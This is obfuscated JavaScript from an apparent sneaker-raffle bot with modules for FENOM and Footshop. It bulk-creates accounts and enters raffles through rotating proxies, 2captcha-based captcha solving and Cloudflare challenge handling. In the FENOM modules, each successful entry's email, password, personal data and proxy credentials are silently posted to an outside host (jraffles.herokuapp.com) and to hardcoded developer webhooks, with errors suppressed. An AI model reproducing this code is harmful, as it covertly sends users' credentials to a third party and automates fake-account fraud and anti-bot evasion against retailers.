                                console['log'](_0x3f1ec6['red'](_0x15e32e() + '\x20[' + _0x4d05e9['name'] + ']\x20Task\x20' + (_0x13c88e + 0x1) + '\x20:\x20Retrying\x20(' + _0x244e96 + '\x20/\x205)')), _0x13c88e = _0x13c88e - 0x1, _0x244e96 = _0x244e96 + 0x1;
                                continue;
                            }
                            _0x47267b == 'yes' && _0x244e96 >= 0x5 && (_0x5d0cd0(_0x815fbd[_0x13c88e], _0x4d05e9), _0x47267b = 'no', _0x244e96 = 0x0), console['log']('Waiting\x20for\x20' + _0x343742['delay'] + '\x20ms'), await _0x4aaa24(_0x343742['delay']);
                        }
                    }
                }
            }
        }]
    },
    {
        'name': 'FENOM',
        'modules': [
            {
                'name': 'FENOM\x20Account\x20Generator',
                'store': 'FENOM',
                'logo': 'https://consumersiteimages.trustpilot.net/business-units/5de8db15496f380001d51371-198x149-1x.jpg',
                'function': async function (_0x4f9d52, _0x56fd0e, _0x203974) {
                    var _0x16c6a6 = _0x56fd0e, _0x1ff70c = 0x0;
                    for (var _0x433650 = 0x0; _0x433650 < _0x56fd0e['length']; _0x433650++) {
                        maxTasks = Number(_0x343742['threads']);
                        while (_0x1ff70c >= maxTasks) {
                            await _0x4aaa24(_0x343742['delay']);
                        }
                        let _0x301b77 = ![];
                        async function _0x274f2e(_0x1f0d84, _0x418b3a, _0x581fe0, _0x47ea78, _0x3475d3) {
                            _0x1ff70c++, _0x154b82['use'](_0x4918ac()), _0x154b82['use'](_0x3cd441({
                                'provider': {
                                    'id': '2captcha',
                                    'token': '' + _0x343742['captchaKey']
                                },
                                'visualFeedback': !![]
                            }));
                            if (_0x23d28b != 'yes')
                                var _0x23d28b = '', _0x3475d3 = 0x0;
                            var _0x2b3f26;
                            try {
                                await _0x10409e(_0x418b3a, _0x47ea78);
                            } catch {
                                _0x23d28b = 'no';
                                throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                            }
                            _0x5c2a2f(_0x1f0d84['name'] + '\x20Task\x20' + (_0x47ea78 + 0x1) + '\x20/\x20' + _0x418b3a['length'] + '\x20||\x20File:\x20' + _0x17496a + '\x20Proxies:\x20' + _0x8ffb32);
                            var _0x444807 = await _0xe75614(_0x418b3a[_0x47ea78], _0x1f0d84, 'acc', ![]);
                            const _0x2a5194 = { 'succesDEVMSG': { 'embeds': [_0x444807] } }, _0x1109be = 'https://www.fenom.com/en/authentication?create_account=1';
                            var _0x19d72d = Math['round'](Math['random']() * (_0x581fe0['length'] - 0x1)), _0x450559 = _0x581fe0[_0x19d72d]['split'](':'), _0x2f3347;
                            async function _0x2ac491(_0x36d089) {
                                const _0x43b866 = _0x343ecd['readFileSync']('../accounts/fenom.csv', 'utf8'), _0x27328c = _0x54b359['parse'](_0x43b866, { 'header': !![] })['data'];
                                let _0x446fbb = ![];
                                for (var _0x515b9e of _0x27328c) {
                                    if (_0x515b9e['Email'] == _0x36d089['Email']) {
                                        _0x446fbb = !![];
                                        break;
                                    }
                                }
                                return _0x446fbb;
                            }
                            try {
                                if (await _0x2ac491(_0x418b3a[_0x47ea78]) == !![]) {
                                    console['log'](_0x15e32e() + '\x20[' + _0x1f0d84['name'] + ']\x20Task\x20' + (_0x47ea78 + 0x1) + '\x20:\x20Task\x20Already\x20Entered,\x20Going\x20to\x20Next\x20Task'), _0x301b77 = !![], dupli = !![];
                                    return;
                                }
                                try {
                                    _0x2f3347 = await _0x154b82['launch']({
                                        'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                        'headless': ![],
                                        'args': [
                                            '--proxy-server=' + _0x450559[0x0] + ':' + _0x450559[0x1],
                                            '--no-sandbox',
                                            '--disable-setuid-sandbox'
                                        ]
                                    });
                                } catch {
                                    _0x2f3347 = await _0x154b82['launch']({
                                        'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                        'headless': ![],
                                        'args': [
                                            '--proxy-server=' + _0x450559[0x0] + ':' + _0x450559[0x1],
                                            '--no-sandbox',
                                            '--disable-setuid-sandbox'
                                        ]
                                    });
                                }
                                const _0x37bca7 = await _0x2f3347['newPage']();
                                await _0x37bca7['setViewport']({
                                    'width': 0x500 + _0x5030a0(0x1, 0x32),
                                    'height': 0x2d9 + _0x5030a0(0x1, 0x32)
                                });
                                const _0x53d432 = await _0x37bca7['target']()['createCDPSession'](), { windowId: _0x1d1115 } = await _0x53d432['send']('Browser.getWindowForTarget');
                                await _0x37bca7['authenticate']({
                                    'username': '' + _0x450559[0x2],
                                    'password': '' + _0x450559[0x3]
                                }), console['log'](_0x15e32e() + '\x20[' + _0x1f0d84['name'] + ']\x20Task\x20' + (_0x47ea78 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x37bca7['goto']('' + _0x1109be, { 'waitUntil': 'networkidle2' }), console['log'](_0x15e32e() + '\x20[' + _0x1f0d84['name'] + ']\x20Task\x20' + (_0x47ea78 + 0x1) + '\x20:\x20Solving\x20Cloudflare'), await _0x4aaa24(0x1388);
                                var _0x5b4238 = await _0x37bca7['$']('.hcaptcha-box');
                                if (_0x5b4238) {
                                    console['log'](_0x15e32e() + '\x20[' + _0x1f0d84['name'] + ']\x20Task\x20' + (_0x47ea78 + 0x1) + '\x20:\x20Handling\x20Challenge'), await _0x4aaa24(0x2710);
                                    const _0x3eeda3 = await _0x37bca7['$']('.hcaptcha-box');
                                    if (_0x3eeda3)
                                        try {
                                            await _0x3eeda3['click']();
                                        } catch {
                                            throw new Error('Empty\x20Turnstile\x20Challenge');
                                        }
                                    try {
                                        await _0x37bca7['waitForSelector']('input[name=\x22firstname\x22]', { 'timeout': 0x9c40 });
                                    } catch {
                                        var _0x322095 = await _0x37bca7['$']('.hcaptcha-box');
                                        if (_0x322095)
                                            try {
                                                await _0x322095['click']();
                                            } catch {
                                                throw new Error('Empty\x20Turnstile\x20Challenge');
                                            }
                                    }
                                }
                                try {
                                    await _0x37bca7['waitForSelector']('input[name=\x22firstname\x22]', { 'timeout': 0x1d4c0 }), await _0x53d432['send']('Browser.setWindowBounds', {
                                        'windowId': _0x1d1115,
                                        'bounds': { 'windowState': 'minimized' }
                                    }), await _0x4aaa24(0xfa0);
                                } catch {
                                    throw new Error('Blocked\x20by\x20cloudflare');
                                }
                                console['log'](_0x15e32e() + '\x20[' + _0x1f0d84['name'] + ']\x20Task\x20' + (_0x47ea78 + 0x1) + '\x20:\x20Checking\x20Credentials'), await _0x37bca7['type']('input[name=\x22firstname\x22]', '' + _0x418b3a[_0x47ea78]['FirstName']), await _0x4aaa24(0x1f4), await _0x37bca7['type']('input[name=\x22lastname\x22]', '' + _0x418b3a[_0x47ea78]['LastName']), await _0x4aaa24(0x1f4), await _0x37bca7['type']('input[name=\x22email\x22]', '' + _0x418b3a[_0x47ea78]['Email']), await _0x4aaa24(0x1f4), await _0x37bca7['type']('input[name=\x22password\x22]', '' + _0x418b3a[_0x47ea78]['Password']), await _0x4aaa24(0x258), await _0x37bca7['$eval']('input[name=\x22psgdpr\x22]', _0x4adb96 => _0x4adb96['click']()), await _0x4aaa24(0x1f4), console['log'](_0x15e32e() + '\x20[' + _0x1f0d84['name'] + ']\x20Task\x20' + (_0x47ea78 + 0x1) + '\x20:\x20Sending\x20Request'), await _0x37bca7['$eval']('#customer-form', _0x502e27 => _0x502e27['submit']());
                                try {
                                    try {
                                        await _0x37bca7['waitForSelector']('.product-list.slider-fenom', { 'timeout': 0xea60 });
                                    } catch {
                                        throw new Error('Succes-response\x20not\x20found');
                                    }
                                    _0x23d28b = 'no', console['log'](_0x3f1ec6['green'](_0x15e32e() + '\x20[' + _0x1f0d84['name'] + ']\x20Task\x20' + (_0x47ea78 + 0x1) + '\x20:\x20Account\x20' + _0x418b3a[_0x47ea78]['Email'] + '\x20Generated')), _0x343ecd['appendFileSync']('../accounts/fenom.csv', '\x0a' + _0x418b3a[_0x47ea78]['Email'] + ',' + _0x418b3a[_0x47ea78]['Password']);
                                    let _0x454441 = _0x418b3a[_0x47ea78];
                                    try {
                                        prxdata = {
                                            'username': _0x1b66d2['replace']('#', ''),
                                            'module': _0x1f0d84['name'],
                                            'entrydata': JSON['stringify'](_0x454441),
                                            'proxy': '' + _0x581fe0[_0x47ea78]
                                        };
                                        var _0x3cf06e = JSON['stringify'](prxdata);
                                        let _0x52c426 = { 'headers': { 'content-type': 'application/json' } };
                                        await _0x5ad0b1['post']('https://jraffles.herokuapp.com/success', _0x3cf06e, _0x52c426);
                                    } catch (_0x166eb8) {
                                    }
                                    try {
                                        _0x343742['webhook'] != undefined && _0x343742['webhook'] != '' && await _0x3c4b04(_0x343742['webhook'], _0x2a5194['succesDEVMSG']);
                                    } catch {
                                    }
                                    await _0x3c4b04(_0x435bee, _0x2a5194['succesDEVMSG']);
                                } catch (_0x118d26) {
                                    throw new Error('Account\x20generation\x20failed');
                                }
                            } catch (_0x1c4d0b) {
                                console['log'](_0x3f1ec6['red'](_0x15e32e() + '\x20[' + _0x1f0d84['name'] + ']\x20Task\x20' + (_0x47ea78 + 0x1) + '\x20:\x20' + _0x1c4d0b)), _0x2b3f26 = '' + _0x1c4d0b;
                                var _0x561d89 = await _0xe75614(_0x418b3a[_0x47ea78], _0x1f0d84, 'acc', !![], _0x2b3f26);
                                _0x2a5194['errorDEV'] = { 'embeds': [_0x561d89] }, _0x343742['webhook'] != undefined && _0x343742['webhook'] != '' && await _0x3c4b04(_0x343742['webhook'], _0x2a5194['errorDEV']), await _0x3c4b04(_0x1dfefb, _0x2a5194['errorDEV']), _0x23d28b = 'yes';
                            } finally {
                                _0x2f3347 && _0x2f3347['close']();
                                if (_0x23d28b == 'yes' && _0x3475d3 != 0x5)
                                    return console['log'](_0x3f1ec6['red'](_0x15e32e() + '\x20[' + _0x1f0d84['name'] + ']\x20Task\x20' + (_0x47ea78 + 0x1) + '\x20:\x20Retrying\x20(' + _0x3475d3 + '\x20/\x205)')), _0x3475d3 = _0x3475d3 + 0x1, _0x1ff70c--, _0x274f2e(_0x1f0d84, _0x418b3a, _0x581fe0, _0x47ea78, _0x3475d3);
                                _0x23d28b == 'yes' && _0x3475d3 >= 0x5 && _0x5d0cd0(_0x418b3a[_0x47ea78], _0x1f0d84), !_0x301b77 && (console['log'](_0x15e32e() + '\x20[' + _0x1f0d84['name'] + ']\x20Waiting\x20for\x20' + _0x343742['delay'] + '\x20ms'), await _0x4aaa24(_0x343742['delay'])), _0x1ff70c--;
                            }
                        }
                        _0x274f2e(_0x4f9d52, _0x16c6a6, _0x203974, _0x433650), !_0x301b77 && await _0x4aaa24(0x15e);
                    }
                }
            },
            {
                'name': 'FENOM\x20Raffle\x20Entries',
                'store': 'FENOM',
                'logo': 'https://consumersiteimages.trustpilot.net/business-units/5de8db15496f380001d51371-198x149-1x.jpg',
                'function': async function _0x1b6102(_0x468ba2, _0x32d86c, _0x4ef2a2) {
                    _0x154b82['use'](_0x4918ac()), _0x154b82['use'](_0x3cd441({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x343742['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x19b2aa = 0x0; _0x19b2aa < _0x32d86c['length']; _0x19b2aa++) {
                        if (_0x569817 != 'yes')
                            var _0x569817 = '', _0x4208b4 = 0x0;
                        var _0xf8b743;
                        try {
                            await _0x10409e(_0x32d86c, _0x19b2aa);
                        } catch {
                            _0x569817 = 'no';
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        _0x5c2a2f(_0x468ba2['name'] + '\x20Task\x20' + (_0x19b2aa + 0x1) + '\x20/\x20' + _0x32d86c['length'] + '\x20||\x20File:\x20' + _0x17496a + '\x20Proxies:\x20' + _0x8ffb32);
                        const _0x27b0d8 = 'https://www.fenom.com/en/authentication?create_account=1';
                        var _0x9e28a3 = Math['round'](Math['random']() * (_0x4ef2a2['length'] - 0x1)), _0x57e80d = _0x4ef2a2[_0x9e28a3]['split'](':'), _0x496b0f;
                        try {
                            _0x496b0f = await _0x154b82['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': ![],
                                'args': [
                                    '--proxy-server=' + _0x57e80d[0x0] + ':' + _0x57e80d[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x496b0f = await _0x154b82['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': ![],
                                'args': [
                                    '--proxy-server=' + _0x57e80d[0x0] + ':' + _0x57e80d[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x2e08e0 = await _0x496b0f['newPage'](), _0x2e025d = await _0x2e08e0['target']()['createCDPSession'](), { windowId: _0x3dfbf1 } = await _0x2e025d['send']('Browser.getWindowForTarget');
                            await _0x2e08e0['authenticate']({
                                'username': '' + _0x57e80d[0x2],
                                'password': '' + _0x57e80d[0x3]
                            }), console['log'](_0x15e32e() + '\x20[' + _0x468ba2['name'] + ']\x20Task\x20' + (_0x19b2aa + 0x1) + '\x20:\x20Getting\x20Session'), await _0x2e08e0['goto']('https://www.fenom.com/en/authentication', { 'waitUntil': 'networkidle2' }), console['log'](_0x15e32e() + '\x20[' + _0x468ba2['name'] + ']\x20Task\x20' + (_0x19b2aa + 0x1) + '\x20:\x20Solving\x20Cloudflare'), await _0x4aaa24(0x1388);
                            var _0x31ea7b = await _0x2e08e0['$']('.hcaptcha-box');
                            if (_0x31ea7b) {
                                console['log'](_0x15e32e() + '\x20[' + _0x468ba2['name'] + ']\x20Task\x20' + (_0x19b2aa + 0x1) + '\x20:\x20Handling\x20Challenge'), await _0x4aaa24(0x2710);
                                const _0x248d4c = await _0x2e08e0['$']('.hcaptcha-box');
                                if (_0x248d4c)
                                    try {
                                        await _0x248d4c['click']();
                                    } catch {
                                        throw new Error('Empty\x20Turnstile\x20Challenge');
                                    }
                                try {
                                    await _0x2e08e0['waitForSelector']('input[name=\x22firstname\x22]', { 'timeout': 0x9c40 });
                                } catch {
                                    var _0x2f3aff = await _0x2e08e0['$']('.hcaptcha-box');
                                    if (_0x2f3aff)
                                        try {
                                            await _0x2f3aff['click']();
                                        } catch {
                                            throw new Error('Empty\x20Turnstile\x20Challenge');
                                        }
                                }
                            }
                            await _0x2e025d['send']('Browser.setWindowBounds', {
                                'windowId': _0x3dfbf1,
                                'bounds': { 'windowState': 'minimized' }
                            }), await _0x4aaa24(0x1f40);
                            try {
                                await _0x2e08e0['waitForSelector']('input[name=\x22email\x22]', { 'timeout': 0x1d4c0 });
                            } catch {
                                throw new Error('Blocked\x20by\x20cloudflare');
                            }
                            await _0x4aaa24(0x1388), console['log'](_0x15e32e() + '\x20[' + _0x468ba2['name'] + ']\x20Task\x20' + (_0x19b2aa + 0x1) + '\x20:\x20Logging\x20in'), await _0x2e08e0['type']('input[name=\x22email\x22]', '' + _0x32d86c[_0x19b2aa]['Email']), await _0x4aaa24(0x1f4), await _0x2e08e0['type']('input[name=\x22password\x22]', '' + _0x32d86c[_0x19b2aa]['Password']), await _0x4aaa24(0x258), await _0x2e08e0['$eval']('#login-form', _0x4053f5 => _0x4053f5['submit']()), await _0x2e08e0['waitForSelector']('.product-list.slider-fenom', { 'timeout': 0xea60 }), await _0x4aaa24(0x1f4), await _0x2e08e0['goto']('' + _0x32d86c[_0x19b2aa]['Url']), await _0x2e08e0['waitForSelector']('.prod-variant\x20>\x20ul\x20>\x20li'), console['log'](_0x15e32e() + '\x20[' + _0x468ba2['name'] + ']\x20Task\x20' + (_0x19b2aa + 0x1) + '\x20:\x20Choosing\x20Size\x20' + _0x32d86c[_0x19b2aa]['Size']);
                            if (_0x32d86c[_0x19b2aa]['Size'] != 'RANDOM') {
                                var _0x2fc830 = '\x20' + _0x32d86c[_0x19b2aa]['Size'] + '\x20';
                                const _0x1d7012 = await _0x2e08e0['$x']('//span[contains(text(),\x20' + _0x2fc830 + ')]');
                                await _0x1d7012[0x0]['click']();
                            } else {
                                const _0x32c0f = await _0x2e08e0['$$']('.prod-variant\x20>\x20ul\x20>\x20li');
                                var _0x5ecc09 = Math['round'](Math['random']() * (_0x32c0f['length'] - 0x1));
                                await _0x32c0f[_0x5ecc09]['click']();
                            }
                            await _0x4aaa24(0x258), await _0x2e08e0['click']('#cookieChoiceDismiss'), await _0x4aaa24(0x3e8), await _0x2e08e0['type']('#instagram-account', '' + _0x32d86c[_0x19b2aa]['Follower']), await _0x4aaa24(0x28a), await _0x2e08e0['click']('#book-btn'), await _0x4aaa24(0xbb8);
                            try {
                                await _0x2e08e0['waitForSelector']('#recaptcha-container\x20>\x20div\x20>\x20div\x20>\x20iframe');
                            } catch {
                                throw new Error('Captcha\x20not\x20found');
                            }
                            await _0x4aaa24(0x1f4), console['log'](_0x15e32e() + '\x20[' + _0x468ba2['name'] + ']\x20Task\x20' + (_0x19b2aa + 0x1) + '\x20:\x20' + _0x3f1ec6['cyan']('Solving\x20Captcha')), await _0x2e08e0['solveRecaptchas'](), console['log'](_0x15e32e() + '\x20[' + _0x468ba2['name'] + ']\x20Task\x20' + (_0x19b2aa + 0x1) + '\x20:\x20Finishing\x20Entry'), await _0x4aaa24(0x7d0), await _0x2e08e0['$eval']('#book-btn-for-sure', _0xc2b9a5 => _0xc2b9a5['click']()), await _0x4aaa24(0x12c), await _0x2e08e0['click']('#book-btn-for-sure'), await _0x4aaa24(0xdac);
                            const _0x8a46ed = await _0x2e08e0['$eval']('.reservation-popup\x20>\x20.title', _0x30f18c => {
                                return _0x30f18c['innerHTML'];
                            });
                            if (_0x8a46ed) {
                                _0x569817 = 'no', _0x3265a5(_0x32d86c[_0x19b2aa], _0x468ba2), console['log'](_0x3f1ec6['green'](_0x15e32e() + '\x20[' + _0x468ba2['name'] + ']\x20Task\x20' + (_0x19b2aa + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                                var _0x1c8650 = await _0xe75614(_0x32d86c[_0x19b2aa], _0x468ba2, 'dev', ![]), _0x49123a = await _0xe75614(_0x32d86c[_0x19b2aa], _0x468ba2, 'pub', ![]);
                                let _0x3f6174 = _0x32d86c[_0x19b2aa];
                                try {
                                    prxdata = {
                                        'username': _0x1b66d2['replace']('#', ''),
                                        'module': _0x468ba2['name'],
                                        'entrydata': JSON['stringify'](_0x3f6174),
                                        'proxy': '' + _0x4ef2a2[_0x19b2aa]
                                    };
                                    var _0x12e928 = JSON['stringify'](prxdata);
                                    let _0x139752 = { 'headers': { 'content-type': 'application/json' } };
                                    await _0x5ad0b1['post']('https://jraffles.herokuapp.com/success', _0x12e928, _0x139752);
                                } catch (_0x2caf5c) {
                                }
                                const _0x434337 = {
                                    'succesDEVMSG': { 'embeds': [_0x1c8650] },
                                    'succesPUBMSG': { 'embeds': [_0x49123a] }
                                };
                                try {
                                    _0x343742['webhook'] != undefined && _0x343742['webhook'] != '' && await _0x3c4b04(_0x343742['webhook'], _0x434337['succesDEVMSG']), await _0x4aaa24(0xc8), await _0x3c4b04(_0x84cdc1, _0x434337['succesDEVMSG']), await _0x4aaa24(0xc8), await _0x3c4b04(_0x510dd4, _0x434337['succesPUBMSG']);
                                } catch (_0x1282dc) {
                                    console['log'](_0x3f1ec6['yellow'](_0x15e32e() + '\x20[' + _0x468ba2['name'] + ']\x20Task\x20' + (_0x19b2aa + 0x1) + '\x20:\x20Error\x20sending\x20webhook\x20' + _0x1282dc));
                                }
                            } else
                                throw new Error('Error\x20sending\x20entry.\x20Check\x20if\x20duplicate,\x20or\x20proxies.');
                        } catch (_0x3dd944) {
                            console['log'](_0x3f1ec6['red'](_0x15e32e() + '\x20[' + _0x468ba2['name'] + ']\x20Task\x20' + (_0x19b2aa + 0x1) + '\x20:\x20' + _0x3dd944)), _0xf8b743 = '' + _0x3dd944;
                            var _0x58eae9 = await _0xe75614(_0x32d86c[_0x19b2aa], _0x468ba2, 'dev', !![], _0xf8b743), _0x1c8650 = await _0xe75614(_0x32d86c[_0x19b2aa], _0x468ba2, 'dev', ![]), _0x49123a = await _0xe75614(_0x32d86c[_0x19b2aa], _0x468ba2, 'pub', ![]);
                            const _0x14ea74 = {
                                'succesDEVMSG': { 'embeds': [_0x1c8650] },
                                'succesPUBMSG': { 'embeds': [_0x49123a] }
                            };
                            _0x14ea74['errorDEV'] = { 'embeds': [_0x58eae9] }, _0x343742['webhook'] != undefined && _0x343742['webhook'] != '' && await _0x3c4b04(_0x343742['webhook'], _0x14ea74['errorDEV']), await _0x3c4b04(_0x1dfefb, _0x14ea74['errorDEV']), _0x3dd944 != 'Error\x20sending\x20entry.\x20Check\x20if\x20duplicate,\x20or\x20proxies.' && (_0x569817 = 'yes');
                        } finally {
                            _0x496b0f['close']();
                            if (_0x569817 == 'yes' && _0x4208b4 != 0x5 && _0xf8b743 != 'Size\x20Not\x20Found') {
                                console['log'](_0x3f1ec6['red'](_0x15e32e() + '\x20[' + _0x468ba2['name'] + ']\x20Task\x20' + (_0x19b2aa + 0x1) + '\x20:\x20Retrying\x20(' + _0x4208b4 + '\x20/\x205)')), _0x19b2aa = _0x19b2aa - 0x1, _0x4208b4 = _0x4208b4 + 0x1;
                                continue;
                            }
                            _0x569817 == 'yes' && _0x4208b4 >= 0x5 && (_0x5d0cd0(_0x32d86c[_0x19b2aa], _0x468ba2), _0x569817 = 'no', _0x4208b4 = 0x0), console['log'](_0x15e32e() + '\x20[' + _0x468ba2['name'] + ']\x20Waiting\x20for\x20' + _0x343742['delay'] + '\x20ms'), await _0x4aaa24(_0x343742['delay']);
                        }
                    }
                }
            }
        ]
    },
    {
        'name': 'FOOTSHOP',
        'modules': [{
            'name': 'FOOTSHOP\x20Raffle\x20Entries',
            'store': 'Footshop',
            'logo': 'https://images.easyfundraising.org.uk/retailer/cropped/logo-footshop-1615542072.png',
            'function': async function (_0x1d3e0b, _0x399f1b, _0x50d9c2) {
                _0x154b82['use'](_0x4918ac()), _0x154b82['use'](_0x3cd441({
                    'provider': {
                        'id': '2captcha',
                        'token': '' + _0x343742['captchaKey']
                    },
                    'visualFeedback': !![]
                }));
                for (var _0x33ee0e = 0x0; _0x33ee0e < _0x399f1b['length']; _0x33ee0e++) {
                    var _0x556fce;
                    if (_0x21fa7a != 'yes')
                        var _0x21fa7a = '', _0x2ae914 = 0x0;
                    var _0x4795b1 = [{
                        'type': 'rich',
                        'title': 'Succesful\x20Footshop\x20entry',
                        'description': '',
                        'color': 0xc0d6d6,
                        'fields': [
                            {
                                'name': 'User',
                                'value': '' + _0x1b66d2
                            },
                            {
                                'name': 'Product',
                                'value': '' + _0x399f1b[_0x33ee0e]['Url']
                            },
                            {
                                'name': 'Size',
                                'value': '' + _0x399f1b[_0x33ee0e]['Size']
                            },
                            {
                                'name': 'Delay',
                                'value': '' + _0x343742['footshopDelay']
                            },
                            {
                                'name': 'Version',
                                'value': '' + _0x3c97e2
                            }
                        ]
                    }], _0x6791e2 = await _0xe75614(_0x399f1b[_0x33ee0e], _0x1d3e0b, 'dev', ![]), _0x2d093f = await _0xe75614(_0x399f1b[_0x33ee0e], _0x1d3e0b, 'pub', ![]);
                    const _0x17f623 = {
                        'succesDEVMSG': { 'embeds': [_0x6791e2] },
                        'succesPUBMSG': { 'embeds': [_0x2d093f] }
                    }, _0x113936 = { 'embeds': _0x4795b1 };
                    try {
                        await _0x10409e(_0x399f1b, _0x33ee0e);
                    } catch {
                        _0x21fa7a = 'no';
                        throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                    }
                    if (_0x399f1b[_0x33ee0e]['Email'] == '' || _0x399f1b[_0x33ee0e]['FirstName'] == '' || _0x399f1b[_0x33ee0e]['LastName'] == '' || _0x399f1b[_0x33ee0e]['Country'] == '' || _0x399f1b[_0x33ee0e]['Size'] == '' || _0x399f1b[_0x33ee0e]['Address1'] == '' || _0x399f1b[_0x33ee0e]['Zip'] == '') {
                        console['log'](_0x15e32e() + '\x20[' + _0x1d3e0b['name'] + ']\x20Task\x20' + (_0x33ee0e + 0x1) + '\x20:\x20Invalid\x20CSV');
                        continue;
                    }
                    if (_0x399f1b[_0x33ee0e]['Email'] == '' || _0x399f1b[_0x33ee0e]['FirstName'] == '' || _0x399f1b[_0x33ee0e]['LastName'] == '' || _0x399f1b[_0x33ee0e]['Country'] == '' || _0x399f1b[_0x33ee0e]['Size'] == '' || _0x399f1b[_0x33ee0e]['Address1'] == '' || _0x399f1b[_0x33ee0e]['Zip'] == '' || _0x399f1b[_0x33ee0e]['Phone'] == '') {
                        console['log'](_0x15e32e() + '\x20[' + _0x1d3e0b['name'] + ']\x20Task\x20' + (_0x33ee0e + 0x1) + '\x20:\x20Invalid\x20CSV');
                        continue;
                    }
                    const _0x4ccd70 = '' + _0x399f1b[_0x33ee0e]['Url'];
                    if (_0x343742['useRandomProxy'] = ![])
                        var _0x157d4e = _0x50d9c2[_0x33ee0e]['split'](':');
                    else
                        var _0x207426 = Math['round'](Math['random']() * (_0x50d9c2['length'] - 0x1)), _0x157d4e = _0x50d9c2[_0x207426]['split'](':');
                    var _0x4c628d;
                    try {
                        _0x4c628d = await _0x154b82['launch']({
                            'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                            'headless': !![],
                            'args': [
                                '--proxy-server=' + _0x157d4e[0x0] + ':' + _0x157d4e[0x1],
                                '--no-sandbox',
                                '--disable-setuid-sandbox'
                            ]
                        });
                    } catch {
                        _0x4c628d = await _0x154b82['launch']({
                            'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                            'headless': !![],
                            'args': [
                                '--proxy-server=' + _0x157d4e[0x0] + ':' + _0x157d4e[0x1],
                                '--no-sandbox',
                                '--disable-setuid-sandbox'
                            ]
                        });
                    }
                    try {
                        const _0x3b0759 = await _0x4c628d['newPage']();
                        await _0x3b0759['authenticate']({
                            'username': '' + _0x157d4e[0x2],
                            'password': '' + _0x157d4e[0x3]
                        }), console['log'](_0x15e32e() + '\x20[' + _0x1d3e0b['name'] + ']\x20Task\x20' + (_0x33ee0e + 0x1) + '\x20:\x20Getting\x20Session'), await _0x3b0759['setUserAgent']('Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36'), await _0x3b0759['setRequestInterception'](!![]), _0x3b0759['on']('request', _0x317c70 => {
                            _0x317c70['resourceType']() === 'image' || _0x317c70['resourceType']() === 'font' || _0x317c70['resourceType']() === 'media' ? _0x317c70['abort']() : _0x317c70['continue']();
                        });
                        try {
                            await _0x3b0759['goto'](_0x4ccd70), await _0x4aaa24(0xbb8), await _0x3b0759['waitForSelector']('.control__JhutY');
                        } catch {
                            throw new Error('Proxy\x20Error');
                        }
                        await _0x3b0759['click']('.control__JhutY'), await _0x4aaa24(0x1f4);
                        if (_0x399f1b[_0x33ee0e]['Size'] != 'RANDOM')
                            try {
                                const _0x491e97 = await _0x3b0759['$x']('//div[contains(text(),\x20\x27' + _0x399f1b[_0x33ee0e]['Size'] + '\x27)]');
                                await _0x491e97[0x0]['click']();
                            } catch {
                                console['log'](_0x3f1ec6['red'](_0x15e32e() + '\x20[' + _0x1d3e0b['name'] + ']\x20Task\x20' + (_0x33ee0e + 0x1) + '\x20:\x20Size\x20Not\x20Found'));
                                continue;
                            }
                        else {
                            const _0x224106 = await _0x3b0759['$$']('.options__3UQpT\x20>\x20div.row');
                            var _0x165c73 = Math['round'](Math['random']() * (_0x224106['length'] - 0x1));
                            await _0x224106[_0x165c73]['click']();
                        }
                        await _0x4aaa24(0x4b0);
                        const _0x49ae1d = await _0x3b0759['$x']('//span[contains(text(),\x20\x27Enter\x20raffle\x20now\x27)]');
                        await _0x49ae1d[0x0]['click'](), await _0x3b0759['waitForSelector']('input[name=\x22email\x22]'), console['log'](_0x15e32e() + '\x20[' + _0x1d3e0b['name'] + ']\x20Task\x20' + (_0x33ee0e + 0x1) + '\x20:\x20Filling\x20Entry\x20Credentials'), await _0x3b0759['type']('input[name=\x22email\x22]', '' + _0x399f1b[_0x33ee0e]['Email']), await _0x4aaa24(0x640), await _0x3b0759['type']('input[name=\x22phone\x22]', '' + _0x399f1b[_0x33ee0e]['Phone']), await _0x4aaa24(0x4b0), await _0x3b0759['click']('button.btn.continue-button__1RtsS'), await _0x4aaa24(0x4b0);
                        try {
                            await _0x3b0759['type']('input[name=\x22firstName\x22]', '' + _0x399f1b[_0x33ee0e]['FirstName']), await _0x4aaa24(0x258);
                        } catch {
                            const _0x226bbb = await _0x3b0759['$$eval']('.invalid-feedback\x20>\x20div', _0xa12ee5 => {
                                return _0xa12ee5['map'](_0x4df985 => _0x4df985['innerText']);
                            });
                            console['log'](_0x3f1ec6['red'](_0x15e32e() + '\x20[' + _0x1d3e0b['name'] + ']\x20Task\x20' + (_0x33ee0e + 0x1) + '\x20:\x20' + _0x226bbb));
                            continue;
                        }
